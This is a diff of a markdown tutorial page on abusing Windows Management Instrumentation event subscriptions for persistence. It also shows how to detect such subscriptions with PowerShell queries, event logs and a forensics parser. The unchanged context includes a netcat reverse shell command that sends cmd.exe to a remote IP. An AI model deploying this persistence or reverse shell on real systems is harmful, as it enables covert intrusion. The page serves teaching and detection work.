@@ -1,16 +1,16 @@
 ---
-description: 'Persistence, Privilege Escalation'
+description: Persistence, Privilege Escalation
 ---
 
 # Abusing Windows Managent Instrumentation
 
 WMI events are made up of 3 key pieces:
 
-* event filters - conditions that the system will listen for \(i.e on new process created, on new disk added, etc.\)
-* event consumers - consumers can carry out actions when event filters are triggered \(i.e run a program, log to a log file, execute a script, etc.\)
+* event filters - conditions that the system will listen for (i.e on new process created, on new disk added, etc.)
+* event consumers - consumers can carry out actions when event filters are triggered (i.e run a program, log to a log file, execute a script, etc.)
 * filter to consumer bindings - the gluing matter that marries event filters and event consumers together in order for the event consumers to get invoked.
 
-WMI Events can be used by both offenders \(persistence, i.e launch payload when system is booted\) as well as defenders \(kill process evil.exe on its creation\).
+WMI Events can be used by both offenders (persistence, i.e launch payload when system is booted) as well as defenders (kill process evil.exe on its creation).
 
 ## Execution
 
@@ -54,7 +54,7 @@ $bindingResult = Set-WmiInstance @wmiParams
 
 Note that the `ExecutablePath` property of the `__EVENTCONSUMER` points to a rudimentary netcat reverse shell:
 
-{% code title="c:\\shell.cmd" %}
+{% code title="c:\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
@@ -68,7 +68,7 @@ Note the process ancestry of the shell - as usual, wmi/winrm spawns processes fr
 
 On the victim/suspected host, we can see all the regsitered WMI event filters, event consumers and their bindings and inspect them for any malicious intents with these commands:
 
-{% code title="\_\_EventFilter@victim" %}
+{% code title="__EventFilter@victim" %}
 ```csharp
 Get-WmiObject -Class __EventFilter -Namespace root\subscription
 ```
@@ -80,7 +80,7 @@ Note the `Query` property suggests this wmi filter is checking system's uptime e
 
 Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:
 
-{% code title="\_\_EventConsumer@victim" %}
+{% code title="__EventConsumer@victim" %}
 ```csharp
 Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 ```
@@ -88,7 +88,7 @@ Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 
 ![](../../../.gitbook/assets/wmi-consumer.png)
 
-{% code title="\_\_FilterToConsumerBinding@victim" %}
+{% code title="__FilterToConsumerBinding@victim" %}
 ```csharp
 Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 ```
@@ -104,7 +104,7 @@ Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that c
 
 If you suspect a host to be compromised and you want to inspect any `FilterToConsumer` bindings, you can do it with PSRemoting and the commands shown above or you can try getting the file`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`
 
-Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like:
+Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI\_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like:
 
 ```bash
 ./PyWMIPersistenceFinder.py OBJECTS.DATA
@@ -138,7 +138,7 @@ Note how we can get a pretty decent glimpse into the malicious WMI persistence e
 
 ## References
 
-Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources listed below: 
+Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources listed below:&#x20;
 
 {% embed url="https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/" %}
 
@@ -154,5 +154,4 @@ Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) a
 
 {% embed url="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/" %}
 
-{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177\(v=winembedded.5\)" %}
-
+{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177(v=winembedded.5)" %}
